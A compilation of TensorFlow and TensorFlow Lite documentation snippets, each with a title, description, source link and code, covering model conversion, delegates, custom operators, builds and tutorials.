TITLE: Implementing Custom GRU Cell Python
DESCRIPTION: This Python class implements a basic GRU cell based on the referenced paper. It handles input and state concatenation, applies dense transformations, computes update and reset gates, and calculates the new GRU state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_18

LANGUAGE: python
CODE:
```
class GRUCell:
  """Builds a traditional GRU cell with dense internal transformations.

  Gated Recurrent Unit paper: https://arxiv.org/abs/1412.3555
  """

  def __init__(self, n_units, forget_bias=0.0):
    self._n_units = n_units
    self._forget_bias = forget_bias
    self._built = False

  def __call__(self, inputs):
    if not self._built:
      self.build(inputs)
    x, gru_state = inputs
    # Dense layer on the concatenation of x and h.
    y = tnp.dot(tnp.concatenate([x, gru_state], axis=-1), self.w1) + self.b1
    # Update and reset gates.
    u, r = tnp.split(tf.sigmoid(y), 2, axis=-1)
    # Candidate.
    c = tnp.dot(tnp.concatenate([x, r * gru_state], axis=-1), self.w2) + self.b2
    new_gru_state = u * gru_state + (1 - u) * tnp.tanh(c)
    return new_gru_state

  def build(self, inputs):
    # State last dimension must be n_units.
    assert inputs[1].shape[-1] == self._n_units
    # The dense layer input is the input and half of the GRU state.
    dense_shape = inputs[0].shape[-1] + self._n_units
    self.w1 = tf.Variable(tnp.random.uniform(
        -0.01, 0.01, (dense_shape, 2 * self._n_units)).astype(tnp.float32))
    self.b1 = tf.Variable((tnp.random.randn(2 * self._n_units) * 1e-6 + self._forget_bias
               ).astype(tnp.float32))
    self.w2 = tf.Variable(tnp.random.uniform(
        -0.01, 0.01, (dense_shape, self._n_units)).astype(tnp.float32))
    self.b2 = tf.Variable((tnp.random.randn(self._n_units) * 1e-6).astype(tnp.float32))
    self._built = True

  @property
  def weights(self):
    return (self.w1, self.b1, self.w2, self.b2)
```

----------------------------------------

TITLE: Creating Keras Model (Python)
DESCRIPTION: Creates the underlying Keras model instance used by the classifier. Includes an option to add loss and metrics during the model creation process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_2

LANGUAGE: python
CODE:
```
create_model(
    with_loss_and_metrics=True
)
```

----------------------------------------

TITLE: Building Native TensorFlow Lite C API Shared Library - Shell
DESCRIPTION: This command uses Bazel to build the TensorFlow Lite C API as a native shared library for the host system. The `-c opt` flag enables optimizations. The resulting shared library file will be located in the `bazel-bin/tensorflow/lite/c` directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel build -c opt //tensorflow/lite/c:tensorflowlite_c
```

----------------------------------------

TITLE: Converting Concrete Functions to TFLite using Python API
DESCRIPTION: Shows how to convert TensorFlow concrete functions obtained from low-level tf.* APIs (like a tf.Module with @tf.function) into a TensorFlow Lite model using tf.lite.TFLiteConverter.from_concrete_functions. It defines a simple Squared module and converts its concrete function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/convert_models.md#_snippet_2

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Create a model using low-level tf.* APIs
class Squared(tf.Module):
  @tf.function(input_signature=[tf.TensorSpec(shape=[None], dtype=tf.float32)])
  def __call__(self, x):
    return tf.square(x)
model = Squared()
# (ro run your model) result = Squared(5.0) # This prints "25.0"
# (to generate a SavedModel) tf.saved_model.save(model, "saved_model_tf_dir")
concrete_func = model.__call__.get_concrete_function()

# Convert the model.

converter = tf.lite.TFLiteConverter.from_concrete_functions([concrete_func],
                                                            model)
tflite_model = converter.convert()

# Save the model.
with open('model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Generating TFLite Flatbuffer In-Memory using ModelWriter (C++)
DESCRIPTION: Illustrates how to obtain the generated TFLite flatbuffer as a byte buffer in memory using the `GetBuffer` method of `tflite::ModelWriter`. Requires a built or modified `Interpreter`. The output buffer pointer (`output_buffer`) and size (`output_buffer_size`) are returned via the provided parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/serialization/README.md#_snippet_2

LANGUAGE: C++
CODE:
```
std::unique_ptr<uint8_t[]> output_buffer;
size_t output_buffer_size;
tflite::ModelWriter writer(interpreter.get());
writer.GetBuffer(&output_buffer, &output_buffer_size);
```

----------------------------------------

TITLE: Preprocessing Audio for TFLite Inference Python
DESCRIPTION: Reads a raw audio file, normalizes the data, and splits it into fixed-size windows using `tf.signal.frame` with padding. This prepares the audio data into the format expected by the serving model's input layer. Requires `scipy.io.wavfile`, `numpy` (np), `tensorflow` (tf), and the `serving_model`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
sample_rate, audio_data = wavfile.read(random_audio, 'rb')

audio_data = np.array(audio_data) / tf.int16.max
input_size = serving_model.input_shape[1]

splitted_audio_data = tf.signal.frame(audio_data, input_size, input_size, pad_end=True, pad_value=0)

print(f'Test audio path: {random_audio}')
print(f'Original size of the audio data: {len(audio_data)}')
print(f'Number of windows for inference: {len(splitted_audio_data)}')
```

----------------------------------------

TITLE: Create Model Method Python
DESCRIPTION: Creates a Keras model for the text task. Allows specifying the number of classes, optimizer, and whether to include loss and metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_3

LANGUAGE: python
CODE:
```
create_model(
    num_classes, optimizer=&#x27;adam&#x27;, with_loss_and_metrics=True
)
```

----------------------------------------

TITLE: Creating TensorFlow Lite Hexagon Delegate C++
DESCRIPTION: This C++ snippet demonstrates how to initialize the Hexagon delegate library path using `TfLiteHexagonInitWithPath`, create a Hexagon delegate instance using `TfLiteHexagonDelegateCreate`, and apply it to a TensorFlow Lite interpreter using `ModifyGraphWithDelegate`. It requires the Hexagon shared libraries to be present on the device and the library path to be correctly specified. The delegate object must persist as long as the interpreter might require graph modification (like resizing).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/hexagon.md#_snippet_4

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/delegates/hexagon/hexagon_delegate.h"

// Assuming shared libraries are under "/data/local/tmp/"
// If files are packaged with native lib in android App then it
// will typically be equivalent to the path provided by
// "getContext().getApplicationInfo().nativeLibraryDir"
const char[] library_directory_path = "/data/local/tmp/";
TfLiteHexagonInitWithPath(library_directory_path);  // Needed once at startup.
::tflite::TfLiteHexagonDelegateOptions params = {0};
// 'delegate_ptr' Need to outlive the interpreter. For example,
// If your use case requires resizing the input or anything that can trigger
// re-applying delegates then 'delegate_ptr' must outlive the interpreter.
auto* delegate_ptr = ::tflite::TfLiteHexagonDelegateCreate(&params);
Interpreter::TfLiteDelegatePtr delegate(delegate_ptr,
  [](TfLiteDelegate* delegate) {
    ::tflite::TfLiteHexagonDelegateDelete(delegate);
  });
interpreter->ModifyGraphWithDelegate(delegate.get());
// After usage of delegate.
TfLiteHexagonTearDown();  // Needed once at end of app/DSP usage.
```

----------------------------------------

TITLE: Getting Pre-Populated JSON Metadata (TFLite Support, Python)
DESCRIPTION: Retrieves the metadata as a JSON string before it has been populated into the TFLite model file. This allows inspection of the generated metadata structure. It differs from `get_populated_metadata_json()` which includes additional fields added during the population step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/bert_nl_classifier/MetadataWriter.md#_snippet_4

LANGUAGE: python
CODE:
```
get_metadata_json() -> str
```

----------------------------------------

TITLE: Creating BertNLClassifier from Options in Python
DESCRIPTION: A class method to create a `BertNLClassifier` instance using configuration defined in the `options` object (of type `BertNLClassifierOptions`). It returns a new `BertNLClassifier` object or raises `ValueError` or `RuntimeError` if creation fails due to invalid options or missing model. Requires a valid `BertNLClassifierOptions` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertNLClassifier.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: <a href="../../../tflite_support/task/text/BertNLClassifierOptions"><code>tflite_support.task.text.BertNLClassifierOptions</code></a>
) -> 'BertNLClassifier'
```

----------------------------------------

TITLE: Run TensorFlow Lite Demo with NNAPI on Android
DESCRIPTION: Executes the label_image binary on Android via `adb shell`, explicitly enabling the Android NNAPI delegate using the '-a 1' flag for potentially faster inference. '-f 1' allows FP32 models to run with FP16 precision if supported.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_8

LANGUAGE: shell
CODE:
```
adb shell "/data/local/tmp/label_image \
    -m /data/local/tmp/mobilenet_v1_1.0_224.tflite \
    -i /data/local/tmp/grace_hopper.bmp \
    -l /data/local/tmp/labels.txt -a 1 -f 1"
```

----------------------------------------

TITLE: Run TensorFlow Lite Demo with XNNPACK Delegate on Android
DESCRIPTION: Executes the label_image binary on Android via `adb shell`, enabling the XNNPACK delegate using the '-x 1' flag. XNNPACK is an optimized backend for neural network operators.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_10

LANGUAGE: shell
CODE:
```
adb shell \
    "/data/local/tmp/label_image \
    -m /data/local/tmp/mobilenet_v1_1.0_224.tflite \
    -i /data/local/tmp/grace_hopper.bmp \
    -l /data/local/tmp/labels.txt -x 1"
```

----------------------------------------

TITLE: Registering Custom Operator (C Example)
DESCRIPTION: Provides a C example function (`MyCustomOpRegistrationExternal`) that demonstrates how to create and register a custom operator in C. It defines the static implementation functions and uses a helper function (`MyCustomOpCreate`) to construct the `TfLiteOperator` by calling `TfLiteOperatorCreate` and the `TfLiteOperatorSet*` functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_12

LANGUAGE: C
CODE:
```
static void* MyCustomOpInit(TfLiteOpaqueContext* context, const char* buffer,
                     size_t length) { ... }
static void MyCustomOpFree(TfLiteOpaqueContext* context, void* buffer) { ... }
static TfLiteStatus MyCustomOpPrepare(TfLiteOpaqueContext* context,
                                      TfLiteOpaqueNode* node) { ... }
static TfLiteStatus MyCustomOpInvoke(TfLiteOpaqueContext* context,
                                     TfLiteOpaqueNode* node) {... }

static TfLiteOperator* MyCustomOpCreate() {
  const TfLiteOperator* r =
      TfLiteOperatorCreate(
          kTfLiteBuiltinCustom, "MyCustomOp", /*version=*/ 1);
  TfLiteOperatorSetInit(r, MyCustomOpInit);
  TfLiteOperatorSetFree(r, MyCustomOpFree);
  TfLiteOperatorSetPrepare(r, MyCustomOpPrepare);
  TfLiteOperatorSetInvoke(r, MyCustomOpEval);
  return r;
}

const TfLiteOperator* MyCustomOpRegistrationExternal() {
  // Singleton instance, intentionally never destroyed.
  static const TfLiteOperator* my_custom_op = MyCustomOpCreate();
  return my_custom_op;
}
```

----------------------------------------

TITLE: Implementing Delegate Kernel TensorFlow Lite C++
DESCRIPTION: Handles the execution of operations delegated to this custom delegate. The `Init` method stores information about the delegated nodes. The `Eval` method iterates through the delegated operations, retrieves input/output tensors, and calls a helper function `ComputeResult` to perform the element-wise ADD or SUB on float32 tensors. It assumes inputs have matching sizes and no broadcasting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_1

LANGUAGE: C++
CODE:
```
// My delegate kernel.
class MyDelegateKernel : public SimpleDelegateKernelInterface {
 public:
  TfLiteStatus Init(TfLiteContext* context,
                    const TfLiteDelegateParams* params) override {
    // Save index to all nodes which are part of this delegate.
    inputs_.resize(params->nodes_to_replace->size);
    outputs_.resize(params->nodes_to_replace->size);
    builtin_code_.resize(params->nodes_to_replace->size);
    for (int i = 0; i < params->nodes_to_replace->size; ++i) {
      const int node_index = params->nodes_to_replace->data[i];
      // Get this node information.
      TfLiteNode* delegated_node = nullptr;
      TfLiteRegistration* delegated_node_registration = nullptr;
      TF_LITE_ENSURE_EQ(
          context,
          context->GetNodeAndRegistration(context, node_index, &delegated_node,
                                          &delegated_node_registration),
          kTfLiteOk);
      inputs_[i].push_back(delegated_node->inputs->data[0]);
      inputs_[i].push_back(delegated_node->inputs->data[1]);
      outputs_[i].push_back(delegated_node->outputs->data[0]);
      builtin_code_[i] = delegated_node_registration->builtin_code;
    }
    return kTfLiteOk;
  }

  TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) override {
    return kTfLiteOk;
  }

  TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) override {
    // Evaluate the delegated graph.
    // Here we loop over all the delegated nodes.
    // We know that all the nodes are either ADD or SUB operations and the
    // number of nodes equals ''inputs_.size()'' and inputs[i] is a list of
    // tensor indices for inputs to node ''i'', while outputs_[i] is the list of
    // outputs for node
    // ''i''. Note, that it is intentional we have simple implementation as this
    // is for demonstration.

    for (int i = 0; i < inputs_.size(); ++i) {
      // Get the node input tensors.
      // Add/Sub operation accepts 2 inputs.
      auto& input_tensor_1 = context->tensors[inputs_[i][0]];
      auto& input_tensor_2 = context->tensors[inputs_[i][1]];
      auto& output_tensor = context->tensors[outputs_[i][0]];
      TF_LITE_ENSURE_EQ(
          context,
          ComputeResult(context, builtin_code_[i], &input_tensor_1,
                        &input_tensor_2, &output_tensor),
          kTfLiteOk);
    }
    return kTfLiteOk;
  }

 private:
  // Computes the result of addition of 'input_tensor_1' and 'input_tensor_2'
  // and store the result in 'output_tensor'.
  TfLiteStatus ComputeResult(TfLiteContext* context, int builtin_code,
                             const TfLiteTensor* input_tensor_1,
                             const TfLiteTensor* input_tensor_2,
                             TfLiteTensor* output_tensor) {
    if (NumElements(input_tensor_1) != NumElements(input_tensor_2) ||
        NumElements(input_tensor_1) != NumElements(output_tensor)) {
      return kTfLiteDelegateError;
    }
    // This code assumes no activation, and no broadcasting needed (both inputs
    // have the same size).
    auto* input_1 = GetTensorData<float>(input_tensor_1);
    auto* input_2 = GetTensorData<float>(input_tensor_2);
    auto* output = GetTensorData<float>(output_tensor);
    for (int i = 0; i < NumElements(input_tensor_1); ++i) {
      if (builtin_code == kTfLiteBuiltinAdd)
        output[i] = input_1[i] + input_2[i];
      else
        output[i] = input_1[i] - input_2[i];
    }
    return kTfLiteOk;
  }

  // Holds the indices of the input/output tensors.
  // inputs_[i] is list of all input tensors to node at index 'i'.
  // outputs_[i] is list of all output tensors to node at index 'i'.
  std::vector<std::vector<int>> inputs_, outputs_;
  // Holds the builtin code of the ops.
  // builtin_code_[i] is the type of node at index 'i'
  std::vector<int> builtin_code_;
};
```

----------------------------------------

TITLE: Creating Float16 Quantization Config - Python
DESCRIPTION: Creates a specific configuration object for float16 post-training quantization. This config can then be used during the export process to apply a specific quantization method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
config = QuantizationConfig.for_float16()
```

----------------------------------------

TITLE: Executing TFLite Model Signature - C++
DESCRIPTION: Illustrates running a specific TFLite model signature ('encode') in C++ using the GetSignatureRunner method, accessing input/output tensors and invoking the runner.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_6

LANGUAGE: C++
CODE:
```
SignatureRunner* encode_runner =
    interpreter->GetSignatureRunner("encode");
encode_runner->ResizeInputTensor("x", {100});
encode_runner->AllocateTensors();

TfLiteTensor* input_tensor = encode_runner->input_tensor("x");
float* input = GetTensorData<float>(input_tensor);
// Fill `input`.

encode_runner->Invoke();

const TfLiteTensor* output_tensor = encode_runner->output_tensor(
    "encoded_result");
float* output = GetTensorData<float>(output_tensor);
// Access `output`.
```

----------------------------------------

TITLE: Evaluating Question Answer Model in Python
DESCRIPTION: Evaluates the trained model using the provided evaluation data. It calculates metrics like Exact Match rate and F1 score. Optional parameters control maximum answer length, null score threshold (for SQuAD v2), verbose logging, and an output directory for saving detailed predictions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_4

LANGUAGE: python
CODE:
```
evaluate(
    data,
    max_answer_length=30,
    null_score_diff_threshold=0.0,
    verbose_logging=False,
    output_dir=None
)
```

----------------------------------------

TITLE: Calling tf.function with Python Value (Print vs tf.print) (Python)
DESCRIPTION: This snippet executes the `tf.function f` defined previously with a Python integer `1`. It shows that for standard Python values, both `print` (during graph construction) and `tf.print` (during graph execution) will output the numerical value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_7

LANGUAGE: python
CODE:
```
f(1)
```

----------------------------------------

TITLE: Implementing Custom Operator Methods (C++ Example)
DESCRIPTION: Illustrates a recommended way to implement the custom operator methods (`Init`, `Free`, `Prepare`, `Invoke`) in C++ using nested namespaces. This approach helps prevent naming conflicts and organizes the operator-specific functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_8

LANGUAGE: C++
CODE:
```
namespace my_namespace::my_custom_op {
  void* Init(TfLiteOpaqueContext* context,
             const char* buffer, size_t length) { ... }
  // ... plus definitions of Free, Prepare, and Invoke ...
}
```

----------------------------------------

TITLE: Add OSSRH Snapshot Repository in Gradle
DESCRIPTION: Configure your root project's Gradle build file to include the Sonatype OSSRH snapshots repository. This repository is necessary to fetch nightly build artifacts of TensorFlow Lite and its related components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_0

LANGUAGE: build
CODE:
```
allprojects {
    repositories {      // should be already there
        mavenCentral()  // should be already there
        maven {         // add this repo to use snapshots
          name 'ossrh-snapshot'
          url 'https://oss.sonatype.org/content/repositories/snapshots'
        }
    }
}
```

----------------------------------------

TITLE: Downloading Dataset Files (Python)
DESCRIPTION: Downloads the training and validation datasets for the question answering task from specified Google Cloud Storage URLs using `tf.keras.utils.get_file`. These datasets are in SQuAD format and are required to fine-tune and evaluate the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
train_data_path = tf.keras.utils.get_file(
    fname='triviaqa-web-train-8000.json',
    origin='https://storage.googleapis.com/download.tensorflow.org/models/tflite/dataset/triviaqa-web-train-8000.json')
validation_data_path = tf.keras.utils.get_file(
    fname='triviaqa-verified-web-dev.json',
    origin='https://storage.googleapis.com/download.tensorflow.org/models/tflite/dataset/triviaqa-verified-web-dev.json')
```

----------------------------------------

TITLE: TensorFlow Custom Op Test Function Combined Inputs Python
DESCRIPTION: A TensorFlow function (`@tf.function`) demonstrating the usage of the `multiplex_4_op.multiplex` custom op within a graph. It shows combining calls to the op where one instance takes lists of tensors for inputs and another takes single tensors, highlighting the op's flexibility in handling different input types. Requires TensorFlow and the custom op `multiplex_4_op`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_5

LANGUAGE: Python
CODE:
```
  @tf.function
  def _both(self):
    a1 = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
    a2 = tf.constant([6, 7, 8, 9, 10], dtype=tf.int64)
    a3 = tf.constant([11, 12, 13, 14, 15], dtype=tf.int64)
    a_123 = [a1, a2, a3]
    b_123 = tf.constant([101, 102, 103, 104, 105], dtype=tf.int64)
    cond1 = tf.constant([False, False, True, False, False], dtype=bool)
    cond2 = tf.constant([False, False, False, False, True], dtype=bool)
    cond3 = tf.constant([True, False, True, False, True], dtype=bool)
    cond_123 = [cond1, cond2, cond3]
    mux_123 = multiplex_4_op.multiplex(cond_123, a_123, b_123)
    b4 = tf.constant([201, 202, 203, 204, 205], dtype=tf.int64)
    cond4 = tf.constant([True, True, True, False, False], dtype=bool)
    result = multiplex_4_op.multiplex(cond4, mux_123, b4)
    return result
```

----------------------------------------

TITLE: Generating and Evaluating Model with Op Denylist (Python)
DESCRIPTION: Generates a TFLite model where all operations specified in the denylist are kept in their original floating-point format. The resulting selective quantized model is then evaluated using a helper function to assess its accuracy after applying the operation-based denylist.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_19

LANGUAGE: python
CODE:
```
selective_quantized_model = debugger.get_nondebug_quantized_model()
eval_tflite(selective_quantized_model, ds)
```

----------------------------------------

TITLE: Inflating RecyclerView Item View - Kotlin
DESCRIPTION: Creates and returns a ViewHolder for the RecyclerView, responsible for displaying a single item in the dataset list. It uses LayoutInflater and view binding to inflate the layout XML file (ItemDatasetBinding) corresponding to an individual dataset entry.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_7

LANGUAGE: Kotlin
CODE:
```
override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
 val binding = ItemDatasetBinding.inflate(
 LayoutInflater.from(parent.context),
 parent,
 false
 )
 return ViewHolder(binding)
}
```

----------------------------------------

TITLE: Build TFLite Pip with Bazel & Flex (Shell)
DESCRIPTION: Builds the TensorFlow Lite standalone pip package using Bazel with support for TensorFlow operations (Flex delegate). This is achieved by setting the `CUSTOM_BAZEL_FLAGS` environment variable to include the necessary Bazel definition `--define=tflite_pip_with_flex=true` before executing the build script.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_14

LANGUAGE: sh
CODE:
```
CUSTOM_BAZEL_FLAGS=--define=tflite_pip_with_flex=true \
  tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh
```

----------------------------------------

TITLE: Generating Processed MovieLens Dataset Files - Python
DESCRIPTION: Processes the raw MovieLens dataset, applying transformations, splitting it into training and testing sets based on timeline length and fraction, building vocabulary, and saving the results (data and metadata) to specified files, typically in TFRecord and JSON formats. Returns metadata about the generated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod
generate_movielens_dataset(
    data_dir,
    generated_examples_dir=None,
    train_filename=&#x27;train_movielens_1m.tfrecord&#x27;,
    test_filename=&#x27;test_movielens_1m.tfrecord&#x27;,
    vocab_filename=&#x27;movie_vocab.json&#x27;,
    meta_filename=&#x27;meta.json&#x27;,
    min_timeline_length=3,
    max_context_length=10,
    max_context_movie_genre_length=10,
    min_rating=None,
    train_data_fraction=0.9,
    build_vocabs=True
)
```

----------------------------------------

TITLE: Define TensorFlow Lite OpResolver Interface C++
DESCRIPTION: Defines the abstract C++ interface for `OpResolver` in TensorFlow Lite, which is responsible for translating operator codes and names into kernel registrations. It requires implementations for finding built-in and custom operators.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_15

LANGUAGE: C++
CODE:
```
class OpResolver {
 public:
  virtual TfLiteRegistration* FindOp(tflite::BuiltinOperator op) const = 0;
  virtual TfLiteRegistration* FindOp(const char* op) const = 0;
  ...
};
```

----------------------------------------

TITLE: Importing Libraries and Configuring Devices (Python)
DESCRIPTION: Imports standard and TensorFlow-related libraries needed for the tutorial, including `tensorflow.experimental.numpy` as `tnp`. It then configures logical devices (virtual GPUs or CPUs) for TensorFlow to use, setting memory limits for GPUs if available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import collections
import functools
import matplotlib.pyplot as plt
import os
import tempfile
import tensorflow as tf
import tensorflow.experimental.numpy as tnp
import tensorflow_datasets as tfds

gpus = tf.config.list_physical_devices('GPU')
if gpus:
  tf.config.set_logical_device_configuration(gpus[0], [
      tf.config.LogicalDeviceConfiguration(memory_limit=128),
      tf.config.LogicalDeviceConfiguration(memory_limit=128)])
  devices = tf.config.list_logical_devices('GPU')
else:
  cpus = tf.config.list_physical_devices('CPU')
  tf.config.set_logical_device_configuration(cpus[0], [
      tf.config.LogicalDeviceConfiguration(),
      tf.config.LogicalDeviceConfiguration()])
  devices = tf.config.list_logical_devices('CPU')

print("Using following virtual devices", devices)
```

----------------------------------------

TITLE: Populating Metadata into TFLite Model (Python)
DESCRIPTION: Embeds the previously generated metadata and any associated files into the provided model buffer. This operation does not modify the original buffer in place but returns a *new* bytearray containing the model with the embedded metadata and files. This resulting buffer is the final, ready-to-use TFLite model file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/metadata_writer/MetadataWriter.md#_snippet_5

LANGUAGE: python
CODE:
```
populate() -> bytearray
```

----------------------------------------

TITLE: Evaluating TFLite Model - TensorFlow Lite Model Maker - Python
DESCRIPTION: Evaluates the accuracy of the exported TensorFlow Lite model using a provided test dataset. This step is recommended to assess the impact of TFLite conversion and quantization on model performance before deployment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_21

LANGUAGE: python
CODE:
```
accuracy = model.evaluate_tflite('mobilebert/model.tflite', test_data)
print('TFLite model accuracy: ', accuracy)
```

----------------------------------------

TITLE: Initializing NL Classifier MetadataWriter in Python
DESCRIPTION: This snippet shows the constructor signature for the `MetadataWriter` class specifically designed for Natural Language classifiers. It takes the model buffer, an optional metadata buffer, and an optional list of associated file paths as arguments. The constructor is used to create an instance of the writer for embedding metadata into a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/nl_classifier/MetadataWriter.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.nl_classifier.MetadataWriter(
    model_buffer: bytearray,
    metadata_buffer: Optional[bytearray] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: Export JAX to TF SavedModel (without Pre/Post) Python
DESCRIPTION: This snippet exports the JAX model to a TensorFlow SavedModel *without* integrating pre/post-processing using `tf.saved_model.save`. It takes the `JaxModule` and explicitly defines the input signature that the *JAX model expects* (after pre-processing: batch, channels, height, width) using `get_concrete_function`, saving it to a different directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
saved_model_dir_2 = "resnet50_saved_model_1"

tf.saved_model.save(
    jax_module,
    saved_model_dir_2,
    signatures=jax_module.methods[JaxModule.DEFAULT_METHOD_KEY].get_concrete_function(
        tf.TensorSpec([1, 3, 224, 224], tf.float32, name="inputs")
    ),
    options=tf.saved_model.SaveOptions(experimental_custom_gradients=True),
)
```

----------------------------------------

TITLE: Illegal Inconsistent Dtype in AutoGraph While Error Python
DESCRIPTION: Shows the equivalent error in AutoGraph. A `while` loop where a variable (`x`) is assigned a value with an inconsistent dtype (`tf.float32`) compared to its initial dtype (`tf.int32`) results in a graph execution error, as AutoGraph converts this to a `tf.while_loop`. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_42

LANGUAGE: Python
CODE:
```
x = tf.constant(0, dtype=tf.int32)
while tf.random.uniform(()) > 0.5:
  x = tf.constant(0, dtype=tf.float32)   # Error -- inconsistent dtypes: int32, float32
```

----------------------------------------

TITLE: Declare TFLite JNI Class and Methods
DESCRIPTION: Defines a Java or Kotlin class that loads the native JNI library (`tflite-jni`) and declares native methods (`loadModel`, `runInference`) which will be implemented in corresponding C/C++ functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_4

LANGUAGE: Java
CODE:
```
package com.google.samples.gms.tflite.c;

public class TfLiteJni {
  static {
    System.loadLibrary("tflite-jni");
  }
  public TfLiteJni() { /**/ };
  public native void loadModel(AssetManager assetManager, String assetName);
  public native float[] runInference(float[] input);
}
```

LANGUAGE: Kotlin
CODE:
```
package com.google.samples.gms.tflite.c

class TfLiteJni() {
  companion object {
    init {
      System.loadLibrary("tflite-jni")
    }
  }
  external fun loadModel(assetManager: AssetManager, assetName: String)
  external fun runInference(input: FloatArray): FloatArray
}
```

----------------------------------------

TITLE: Plotting Pre-training Loss Python
DESCRIPTION: Visualizes the loss curve during the initial pre-training phase using Matplotlib. It plots epochs against cross-entropy loss to show the training progress before conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
plt.plot(epochs, losses, label='Pre-training')
plt.ylim([0, max(plt.ylim())])
plt.xlabel('Epoch')
plt.ylabel('Loss [Cross Entropy]')
plt.legend();
```

----------------------------------------

TITLE: Building TFLite Shared Library (Android) - Shell
DESCRIPTION: This shell command demonstrates building the base TensorFlow Lite C++ shared library target specifically for Android using Bazel. It requires optimization flags, C++17 standard, and targets a specific Android architecture like `android_arm` (or `android_arm64`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_9

LANGUAGE: Shell
CODE:
```
bazel build -c opt --cxxopt=--std=c++17 --config=android_arm \
  //tmp:tensorflowlite
```

----------------------------------------

TITLE: Importing Libraries Python
